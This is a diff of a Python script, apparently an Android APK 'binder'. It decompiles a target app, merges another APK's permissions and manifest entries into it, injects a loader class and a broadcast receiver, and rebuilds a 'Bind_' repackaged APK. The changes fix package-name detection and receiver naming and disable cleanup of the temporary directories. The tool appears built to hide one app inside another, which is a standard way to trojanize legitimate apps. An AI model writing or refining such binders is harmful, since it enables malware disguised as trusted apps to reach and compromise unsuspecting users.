@@ -68,7 +68,11 @@ def main():
     subprocess.call([os.path.join("apktool", apktool_bin), "d", "-f", target_apk, target_dir_smali])
 
     #Obtenemos paquete base del apk objetivo
-    target_package = get_package_manifest(os.path.join(target_dir_smali, ANDROID_MANIFEST))
+    target_package = get_package_manifest(os.path.join(target_dir_smali, ANDROID_MANIFEST), target_dir_smali)
+
+    if target_package == None:
+        print "[x] Problems, package target incorrect"
+        return 1
 
     #Parseamos paquete para obtener la ruta en el fs
     target_class_path = target_package.replace(".", "/")
@@ -80,7 +84,7 @@ def main():
     prepare_loader_properties(loader_class, target_dir_smali, class_bind)
 
     #Editamos el manifest destino estableciendo los permisos correctos y receiver
-    prepare_loader_manifest(target_dir_smali, loader_class)
+    prepare_loader_manifest(target_dir_smali, target_package, loader_class)
 
     print "[+]", target_apk, "processed"
 
@@ -101,7 +105,7 @@ def main():
 
     #Copiamos datos del manifest a bindear al destino
     print "[+] Merge manifest..."
-    merge_manifest(os.path.join(binder_dir_smali, ANDROID_MANIFEST), os.path.join(target_dir_smali, ANDROID_MANIFEST))
+    merge_manifest(os.path.join(binder_dir_smali, ANDROID_MANIFEST), os.path.join(target_dir_smali, ANDROID_MANIFEST), binder_dir_smali)
 
     print "[+]", bind_apk, "processed"
 
@@ -112,17 +116,17 @@ def main():
     subprocess.call([os.path.join("apktool", apktool_bin), "b", target_dir_smali, "Bind_" + target_package + ".apk" ])
 
     #Eliminamos directorios temporales de trabajo
-    shutil.rmtree(target_dir_smali)
-    shutil.rmtree(binder_dir_smali)
+    #shutil.rmtree(target_dir_smali)
+    #shutil.rmtree(binder_dir_smali)
 
     print "[+] Completed"
 
-def merge_manifest(source_manifest, target_manifest):
+def merge_manifest(source_manifest, target_manifest, binder_dir_smali):
 
     s_manifest = minidom.parse(source_manifest)
     t_manifest = minidom.parse(target_manifest)
 
-    s_package = get_package_manifest(source_manifest)
+    s_package = get_package_manifest(source_manifest, binder_dir_smali)
 
     #Obtenemos grupo de permisos del origen y agregamos en destino
     for child_group_permission in s_manifest.getElementsByTagName("permission-group"):
@@ -231,7 +235,7 @@ def copy_files(source_folder, target_folder):
                     None
                 shutil.copy2(os.path.join(root, file), tf)
 
-def prepare_loader_manifest(target_dir_smali, loader_class):
+def prepare_loader_manifest(target_dir_smali, target_package, loader_class):
 
     manifest = minidom.parse(os.path.join(target_dir_smali, ANDROID_MANIFEST))
 
@@ -244,7 +248,7 @@ def prepare_loader_manifest(target_dir_smali, loader_class):
 
     #Agregamos receiver
     receiver = minidom.parse(LOADER_RECEIVER)
-    receiver.getElementsByTagName("receiver")[0].attributes['android:name'].value = "." + loader_class
+    receiver.getElementsByTagName("receiver")[0].attributes['android:name'].value = target_package + "." + loader_class
     manifest.getElementsByTagName("application")[0].appendChild(receiver.getElementsByTagName("receiver")[0])
 
     #Guardamos
@@ -280,11 +284,21 @@ def prepare_loader_class(class_path, loader_class, target_dir_smali):
     fo.write(l_class)
     fo.close()
 
-def get_package_manifest(manifest_file):
+def get_package_manifest(manifest_file, target_dir_smali):
 
     manifest = minidom.parse(manifest_file)
     root_manifest = manifest.getElementsByTagName("manifest")
-    return root_manifest[0].attributes["package"].value
+    #Obtenemos el package del manifest, en caso de ser incorrecto, obtenemos los packages desde los activities
+    if os.path.exists(os.path.join(target_dir_smali, "smali", root_manifest[0].attributes["package"].value)) == True:
+        return root_manifest[0].attributes["package"].value
+    else:
+        for child in manifest.getElementsByTagName("activity"):
+            package = child.attributes['android:name'].value
+            if "." in package:
+                package = package[0:package.rfind(".")]
+                if "." in package: return package
+                else: continue
+        return None
 
 def random_string_generator(size=6):
 
